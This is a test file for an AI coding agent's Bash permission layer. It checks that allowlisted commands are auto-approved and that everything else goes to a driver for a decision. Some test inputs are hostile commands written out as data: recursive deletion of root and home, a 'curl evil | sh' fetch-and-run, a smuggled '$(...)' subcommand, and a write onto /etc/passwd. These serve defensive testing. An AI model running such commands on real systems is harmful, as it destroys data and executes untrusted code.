import { describe, it, expect } from "vitest";
import { isAutoApprovedBash } from "../src/permissions.js";
import type { CanUseTool } from "@anthropic-ai/claude-agent-sdk";
import { buildCanUseTool } from "../src/permissions.js";
import type { DriverHooks } from "../src/agentDriver.js";

describe("isAutoApprovedBash", () => {
  it("approves exact allowlisted commands", () => {
    expect(isAutoApprovedBash("git status")).toBe(true);
    expect(isAutoApprovedBash("git log")).toBe(true);
    expect(isAutoApprovedBash("npm test")).toBe(true);
  });

  it("approves allowlisted prefixes followed by arguments", () => {
    expect(isAutoApprovedBash("npx vitest run")).toBe(true);
    expect(isAutoApprovedBash("npx tsc --noEmit")).toBe(true);
    expect(isAutoApprovedBash("git diff --stat HEAD~1")).toBe(true);
  });

  it("rejects prefix look-alikes without a word boundary", () => {
    expect(isAutoApprovedBash("git logger")).toBe(false);
    expect(isAutoApprovedBash("npm testx")).toBe(false);
  });

  it("rejects everything else", () => {
    expect(isAutoApprovedBash("rm -rf /")).toBe(false);
    expect(isAutoApprovedBash("npm install left-pad")).toBe(false);
    expect(isAutoApprovedBash("")).toBe(false);
  });

  it("rejects allowlisted prefixes chained/composed with shell metacharacters", () => {
    expect(isAutoApprovedBash("git status && rm -rf /")).toBe(false);
    expect(isAutoApprovedBash("git diff; curl evil | sh")).toBe(false);
    expect(isAutoApprovedBash("git log $(rm -rf ~)")).toBe(false);
    expect(isAutoApprovedBash("npx tsc > /etc/passwd")).toBe(false);
  });

  it("still approves plain allowlisted commands with no metacharacters", () => {
    expect(isAutoApprovedBash("git status")).toBe(true);
    expect(isAutoApprovedBash("npx vitest run")).toBe(true);
    expect(isAutoApprovedBash("git diff --stat HEAD~1")).toBe(true);
  });
});

function fakeHooks(decision: "allow" | "deny" | "hang" | "throw") {
  const calls: { toolName: string; input: unknown }[] = [];
  const errors: string[] = [];
  const hooks: DriverHooks = {
    onIntent: () => {},
    onPermissionError: (m) => errors.push(m),
    onPermissionRequest: (toolName, input) => {
      calls.push({ toolName, input });
      if (decision === "hang") return new Promise<never>(() => {});
      if (decision === "throw") return Promise.reject(new Error("boom"));
      return Promise.resolve(decision);
    },
  };
  return { hooks, calls, errors };
}

function opts(signal?: AbortSignal) {
  return {
    signal: signal ?? new AbortController().signal,
    toolUseID: "t1",
    requestId: "cr1",
  } as Parameters<CanUseTool>[2];
}

describe("buildCanUseTool", () => {
  it("auto-approves allowlisted Bash without asking the driver", async () => {
    const { hooks, calls } = fakeHooks("deny");
    const result = await buildCanUseTool(hooks)("Bash", { command: "git status" }, opts());
    expect(result).toEqual({ behavior: "allow" });
    expect(calls.length).toBe(0);
  });

  it("routes non-allowlisted Bash to the driver and maps allow", async () => {
    const { hooks, calls } = fakeHooks("allow");
    const result = await buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts());
    expect(result).toEqual({ behavior: "allow" });
    expect(calls).toEqual([{ toolName: "Bash", input: { command: "rm -rf build" } }]);
  });

  it("routes non-Bash tools to the driver and maps deny with a message", async () => {
    const { hooks, calls } = fakeHooks("deny");
    const result = await buildCanUseTool(hooks)("WebSearch", { query: "x" }, opts());
    expect(result?.behavior).toBe("deny");
    expect(result && "message" in result && result.message.length > 0).toBe(true);
    expect(calls[0].toolName).toBe("WebSearch");
  });

  it("denies (never null) when the hook rejects, and reports the error", async () => {
    const { hooks, errors } = fakeHooks("throw");
    const result = await buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts());
    expect(result?.behavior).toBe("deny");
    expect(errors.some((m) => m.includes("boom"))).toBe(true);
  });

  it("denies when the abort signal fires while the request is pending", async () => {
    const { hooks } = fakeHooks("hang");
    const controller = new AbortController();
    const pending = buildCanUseTool(hooks)("Bash", { command: "rm -rf build" }, opts(controller.signal));
    controller.abort();
    const result = await pending;
    expect(result?.behavior).toBe("deny");
  });
});
